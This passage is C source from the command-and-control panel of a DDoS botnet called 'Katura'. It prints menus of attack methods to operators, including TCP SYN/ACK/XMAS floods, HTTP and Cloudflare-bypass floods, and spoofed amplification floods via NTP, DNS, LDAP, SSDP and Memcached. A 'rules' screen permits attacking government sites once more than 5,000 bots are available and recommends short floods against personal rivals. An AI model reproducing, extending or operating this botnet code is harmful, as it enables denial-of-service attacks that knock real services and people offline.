        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "credits") || strstr(buf, "CREDITS")) 
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char l4udp_cmd1  [5000];
        char l4udp_line1  [5000];
        char l4udp_udp1  [5000];
        char l4udp_udp2  [5000];
        char l4udp_line2  [5000];
        sprintf(l4udp_cmd1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mDevelopers \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]     \r\n");
        sprintf(l4udp_line1, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]---------------------------------------------------------\r\n");
        sprintf(l4udp_udp1,  "\x1b[38;5;196m[\x1b[38;5;50mJack\x1b[38;5;196m] Developed The Base Of Katura \x1b[38;5;50m| \x1b[38;5;82m@FlexingOnLamers\r\n");
        sprintf(l4udp_udp2,  "\x1b[38;5;196m[\x1b[38;5;50mZach\x1b[38;5;196m] Developed The Graphical Output and Network Engagement Of Katura \x1b[38;5;50m| \x1b[38;5;82m@capabilitiesexceed\r\n");
        sprintf(l4udp_line2, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]---------------------------------------------------------\r\n");    
        if(send(thefd, l4udp_cmd1, strlen(l4udp_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_line1, strlen(l4udp_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp1, strlen(l4udp_udp1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_udp2, strlen(l4udp_udp2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4udp_line2, strlen(l4udp_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "L4TCP") || strstr(buf, "l4tcp") || strstr(buf, "l4TCP") || strstr(buf, "L4tcp")) 
        {
        char l4tcp_cmd1 [5000]; // \x1b[38;5;196m \x1b[38;5;50m
        char l4tcp_line1 [5000];                                    // char every line
        char l4tcp_tcp1 [5000];                                    // char every line
        char l4tcp_tcp2 [5000];                                    // char every line
        char l4tcp_tcp3 [5000];                                    // char every line
        char l4tcp_tcp4 [5000];                                    // char every line
        char l4tcp_tcp5 [5000];                                    // char every line
        char l4tcp_tcp6 [5000];                                    // char every line
        char l4tcp_tcp7 [5000];                                    // char every line
        char l4tcp_tcp8 [5000];                                    // char every line
        char l4tcp_tcp9 [5000];                                    // char every line
        char l4tcp_tcp10 [5000];                                    // char every line
        char l4tcp_line2 [5000];                                    // char every line

        sprintf(l4tcp_cmd1,   "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mLayer 4 TCP Listing \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]     \r\n");
        sprintf(l4tcp_line1, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(l4tcp_tcp1,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-ALL Flood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 ALL 0 1\r\n");
        sprintf(l4tcp_tcp2,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-SYN Flood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 SYN 0 1\r\n");
        sprintf(l4tcp_tcp3,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-FIN Flood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 FIN 0 1\r\n");
        sprintf(l4tcp_tcp4,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-RST Flood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 RST 0 1\r\n");
        sprintf(l4tcp_tcp5,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-PSH Flood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 PSH 0 1\r\n");
        sprintf(l4tcp_tcp6,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-\x1b[38;5;82mCRI \x1b[38;5;50mFlood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 \x1b[38;5;82mCRI \x1b[38;5;50m0 1\r\n");
        sprintf(l4tcp_tcp7,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-PRO Flood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 PRO 0 1\r\n");
        sprintf(l4tcp_tcp8,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-ACK Flood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 ACK 0 1\r\n");
        sprintf(l4tcp_tcp9,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-XMAS Flood\x1b[38;5;196m] // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 XMAS 0 1\r\n");
        sprintf(l4tcp_tcp10,  "\x1b[38;5;196m[\x1b[38;5;50mTCP-\x1b[38;5;82mZCH \x1b[38;5;50mFlood\x1b[38;5;196m]  // \x1b[38;5;50mTCP \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m] \x1b[38;5;50m32 \x1b[38;5;82mZCH \x1b[38;5;50m0 1\r\n");
        sprintf(l4tcp_line2, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");     
        if(send(thefd, l4tcp_cmd1, strlen(l4tcp_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_line1, strlen(l4tcp_line1),   MSG_NOSIGNAL) == -1) goto end;  
        if(send(thefd, l4tcp_tcp1, strlen(l4tcp_tcp1),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp2, strlen(l4tcp_tcp2),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp3, strlen(l4tcp_tcp3),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp4, strlen(l4tcp_tcp4),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp5, strlen(l4tcp_tcp5),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp6, strlen(l4tcp_tcp6),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp7, strlen(l4tcp_tcp7),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp8, strlen(l4tcp_tcp8),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp9, strlen(l4tcp_tcp9),   MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l4tcp_tcp10, strlen(l4tcp_tcp10),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l4tcp_line2, strlen(l4tcp_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf); // user type engagement 
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "L7") || strstr(buf, "l7"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char l7_cmd1   [5000];                                                                        // char every line
        char l7_line1  [5000];                                                                        // char every line
        char l7_http1  [5000];                                                                        // char every line
        char l7_http2  [5000];                                                                        // char every line
        char l7_line2  [5000];                                                                        // char every line
 
        sprintf(l7_cmd1,   "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mLayer 7 Method Listing \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]     \r\n");
        sprintf(l7_line1, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]---------------------------------------------------------\r\n");
        sprintf(l7_http1, "\x1b[38;5;196m[\x1b[38;5;50mHTTP Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;50mHTTP  \x1b[38;5;196m[\x1b[38;5;50mURL\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l7_http2, "\x1b[38;5;196m[\x1b[38;5;50mWGET Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;50mWGET  \x1b[38;5;196m[\x1b[38;5;50mURL\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(l7_line2, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]---------------------------------------------------------\r\n");     
        if(send(thefd, l7_cmd1, strlen(l7_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l7_line1, strlen(l7_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l7_http1, strlen(l7_http1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l7_http2, strlen(l7_http2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, l7_line2, strlen(l7_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
         if(strstr(buf, "layer7spoof") || strstr(buf, "LAYER7SPOOF") || strstr(buf, "Layer7spoof")) 
        {
        char l7_SPOOF_cmd1 [500]; // \x1b[38;5;196m \x1b[38;5;50m
        char l7_SPOOF_line1 [500];
        char l7_SPOOF1 [500];                                                                         // char every line
        char l7_SPOOF2 [500];                                                                         // char every line
        char l7_SPOOF3 [500];                                                                         // char every line
        char l7_SPOOF4 [500];                                                                         // char every line
        char l7_SPOOF5 [500];                                                                         // char every line
        char l7_SPOOF6 [500];                                                                         // char every line
        char l7_SPOOF7 [500];                                                                         // char every line
        char l7_SPOOF8 [500];                                                                         // char every line
        char l7_SPOOF_line2 [500];                                            // I'm liking it.

        sprintf(l7_SPOOF_cmd1,   "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;50mLayer 7 Spoof Listing \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]     \r\n");
        sprintf(l7_SPOOF_line1, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(l7_SPOOF1,  "\x1b[38;5;196m[\x1b[38;5;50mHAVEN\x1b[38;5;196m]     // HAVEN\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF2,  "\x1b[38;5;196m[\x1b[38;5;50mJOOMLAV2\x1b[38;5;196m]  // JOOMLAV2\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF3,  "\x1b[38;5;196m[\x1b[38;5;50mCF_BYPASS\x1b[38;5;196m] // CF\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF4,  "\x1b[38;5;196m[\x1b[38;5;50mJOOMLA\x1b[38;5;196m]    // JOOMLA\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF5,  "\x1b[38;5;196m[\x1b[38;5;50mRUDY\x1b[38;5;196m]      // RUDY\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF6,  "\x1b[38;5;196m[\x1b[38;5;50mXMLRPC\x1b[38;5;196m]    // XMLRCP\x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF7,  "\x1b[38;5;196m[\x1b[38;5;50mSLOW\x1b[38;5;196m]      // SLOW \x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF8,  "\x1b[38;5;196m[\x1b[38;5;50mGHP\x1b[38;5;196m]       // GHP \x1b[38;5;50m\r\n");
        sprintf(l7_SPOOF_line2, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");   

        if(send(thefd, l7_SPOOF_cmd1, strlen(l7_SPOOF_cmd1), MSG_NOSIGNAL) == -1) goto end;      // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF_line1, strlen(l7_SPOOF_line1), MSG_NOSIGNAL) == -1) goto end;    // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF1, strlen(l7_SPOOF1), MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF2, strlen(l7_SPOOF2), MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF3, strlen(l7_SPOOF3), MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF4, strlen(l7_SPOOF4), MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF5, strlen(l7_SPOOF5), MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF6, strlen(l7_SPOOF6), MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF7, strlen(l7_SPOOF7), MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF8, strlen(l7_SPOOF8), MSG_NOSIGNAL) == -1) goto end;              // SEND MSG_NOSIGNAL
        if(send(thefd, l7_SPOOF_line2, strlen(l7_SPOOF_line2), MSG_NOSIGNAL) == -1) goto end;    // SEND MSG_NOSIGNAL
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf); // user type engagement 
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "L4SPOOF") || strstr(buf, "l4spoof") || strstr(buf, "l4SPOOF")) 
        {  
        pthread_create(&title, NULL, &titleWriter, sock); 
        char spoof_cmd1  [5000]; 
        char spoof_line1  [5000];                                  //                           [ ADDED METHODS BY ZACH ]
        char spoof_1  [5000];                                      // || MEMECACHE || KATURA || RIP || TFTP || SNMP || DB2 || EFCT-PWR || NAT-PMP 
        char spoof_2  [5000]; 
        char spoof_3  [5000]; 
        char spoof_4  [5000]; 
        char spoof_5  [5000]; 
        char spoof_6  [5000]; 
        char spoof_7  [5000]; 
        char spoof_8  [5000]; 
        char spoof_9  [5000];
        char spoof_10  [5000];
        char spoof_11  [5000];
        char spoof_12  [5000];
        char spoof_13  [5000];
        char spoof_14  [5000];
        char spoof_15  [5000];
        char spoof_16  [5000];
        char spoof_17  [5000]; 
         



        char spoof_line2  [5000];                               // Layer 4 Spoofing, More Added By Zach.
// \x1b[38;5;50m == cyan
// \x1b[38;5;196m == red

 	    	sprintf(spoof_cmd1,   "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] Layer 4 Spoofing Commands\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]     \r\n"); // We Are Defying Spoofed Attacks!
        sprintf(spoof_line1,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n"); // We Are Defying Spoofed Attacks!
        sprintf(spoof_1,      "\x1b[38;5;196m[\x1b[38;5;50mLDAP Flood\x1b[38;5;196m]     \x1b[38;5;196m// \x1b[38;5;50mLDAP     \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_2,      "\x1b[38;5;196m[\x1b[38;5;50mNTP Flood\x1b[38;5;196m]      \x1b[38;5;196m// \x1b[38;5;50mNTP      \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_3,      "\x1b[38;5;196m[\x1b[38;5;50mSSDP Flood\x1b[38;5;196m]     \x1b[38;5;196m// \x1b[38;5;50mSSDP     \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_4,      "\x1b[38;5;196m[\x1b[38;5;50mDNS Flood\x1b[38;5;196m]      \x1b[38;5;196m// \x1b[38;5;50mDNS      \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_5,      "\x1b[38;5;196m[\x1b[38;5;82mREAPER Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;82mREAPER   \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_6,      "\x1b[38;5;196m[\x1b[38;5;50mMSSQL Flood\x1b[38;5;196m]    \x1b[38;5;196m// \x1b[38;5;50mMSSQL    \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_7,      "\x1b[38;5;196m[\x1b[38;5;50mPORTMAP Flood\x1b[38;5;196m]  \x1b[38;5;196m// \x1b[38;5;50mPORTMAP  \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_8,      "\x1b[38;5;196m[\x1b[38;5;50mTS3 Flood\x1b[38;5;196m]      \x1b[38;5;196m// \x1b[38;5;50mTS3      \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_9,      "\x1b[38;5;196m[\x1b[38;5;50mSENTINEL Flood\x1b[38;5;196m] \x1b[38;5;196m// \x1b[38;5;50mSENTINEL \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_10,     "\x1b[38;5;196m[\x1b[38;5;50mTFTP Flood\x1b[38;5;196m]     \x1b[38;5;196m// \x1b[38;5;50mTFTP     \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_11,     "\x1b[38;5;196m[\x1b[38;5;82mKATURA Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;82mKATURA   \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_12,     "\x1b[38;5;196m[\x1b[38;5;50mSNMP Flood\x1b[38;5;196m]     \x1b[38;5;196m// \x1b[38;5;50mSNMP     \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_13,     "\x1b[38;5;196m[\x1b[38;5;50mRIP Flood\x1b[38;5;196m]      \x1b[38;5;196m// \x1b[38;5;50mRIP      \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_14,     "\x1b[38;5;196m[\x1b[38;5;50mDB2 Flood\x1b[38;5;196m]      \x1b[38;5;196m// \x1b[38;5;50mDB2      \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_15,     "\x1b[38;5;196m[\x1b[38;5;82mEFCT-PWR Flood\x1b[38;5;196m] \x1b[38;5;196m// \x1b[38;5;82mEFCT-PWR \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_16,     "\x1b[38;5;196m[\x1b[38;5;50mNAT-PMP Flood\x1b[38;5;196m]  \x1b[38;5;196m// \x1b[38;5;50mNAT-PMP  \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_17,     "\x1b[38;5;196m[\x1b[38;5;50mMEMCACHE Flood\x1b[38;5;196m] \x1b[38;5;196m// \x1b[38;5;50mMEMCACHE \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        sprintf(spoof_line2,  "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
	    	if(send(thefd, spoof_cmd1,  strlen(spoof_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_line1,  strlen(spoof_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_1,  strlen(spoof_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_2,  strlen(spoof_2),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_3,  strlen(spoof_3),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_4,  strlen(spoof_4),   MSG_NOSIGNAL) == -1) goto end;                       // You forgot the SSDP output function Jack, Don't Worry. I added it.
        if(send(thefd, spoof_5,  strlen(spoof_5),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_6,  strlen(spoof_6),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_7,  strlen(spoof_7),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_8,  strlen(spoof_8),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_9,  strlen(spoof_9),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_10,  strlen(spoof_10),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_11,  strlen(spoof_11),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_12,  strlen(spoof_12),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_13,  strlen(spoof_13),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_14,  strlen(spoof_14),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_15,  strlen(spoof_15),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_16,  strlen(spoof_16),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_17,  strlen(spoof_17),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, spoof_line2,  strlen(spoof_line2),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; 
        } 
        continue; 
        } 
        if(strstr(buf, "EXTRA") || strstr(buf, "extra"))
        { // We Are Attempting To Display Extra CMDs!
        EXTRA:
        pthread_create(&title, NULL, &titleWriter, sock);  // \x1b[38;5;196m \x1b[38;5;50m
        char extra_cmd1 [5000];     // char every line
        char extra_line1 [5000];     // char every line
        char extra_list1 [5000];     // char every line
        char extra_list2 [5000];     // char every line
        char extra_list3 [5000];     // char every line
        char extra_list4 [5000];     // char every line
        char extra_line2 [5000];     // char every line                         renamed from 'udp methods' to extra commands because it didn't make sense
    
        sprintf(extra_cmd1, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m] \x1b[38;5;196mEXTRA RULES \x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]     \r\n");
        sprintf(extra_line1, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");
        sprintf(extra_list1, "\x1b[38;5;196mNo Hitting \x1b[38;5;50mGovernment \x1b[38;5;196mSites Unless Bot count is above \x1b[38;5;50m5k\r\n");
        sprintf(extra_list2, "\x1b[38;5;196mMax Time =\x1b[38;5;50m1000\r\n");
        sprintf(extra_list3, "\x1b[38;5;196mThat Does Not Mean Spam \x1b[38;5;50m1000\r\n");
        sprintf(extra_list4, "\x1b[38;5;196mIf Someone Is Pissing You off Just do \x1b[38;5;50m100-600 \x1b[38;5;196mSeconds\r\n");
        sprintf(extra_line2, "\x1b[38;5;196m[\x1b[38;5;50m+\x1b[38;5;196m]\x1b[38;5;50m---------------------------------------------------------\r\n");

        if(send(thefd, extra_cmd1, strlen(extra_cmd1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_line1, strlen(extra_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_list1, strlen(extra_list1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_list2, strlen(extra_list2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_list3, strlen(extra_list3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_list4, strlen(extra_list4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, extra_line2, strlen(extra_line2), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(katura, "\x1b[38;5;196m%s\x1b[38;5;82m@\x1b[38;5;50mKatura\x1b[38;5;196m#", accounts[find_line].username, buf);
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "RULES") || strstr(buf, "rules")) 
        { // We Are Attempting To Display The Rules!
        RULES:
        pthread_create(&title, NULL, &titleWriter, sock);
        char rule_cmd1  [5000];     // char every line
        char rule_line1  [5000];     // char every line
